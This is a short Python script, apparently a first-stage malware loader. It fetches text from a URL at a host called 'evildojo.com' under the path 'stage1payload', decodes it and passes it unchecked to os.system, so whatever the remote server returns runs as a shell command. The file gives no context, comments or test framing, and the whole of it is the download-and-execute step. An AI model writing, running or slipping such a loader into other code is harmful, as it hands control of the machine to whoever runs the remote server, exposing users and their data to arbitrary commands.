import os
import urllib
import urllib.request
x = urllib.request.urlopen("https://www.evildojo.com/stage1payload")
y = x.read()
z = y.decode("utf8")
x.close()
os.system(z)

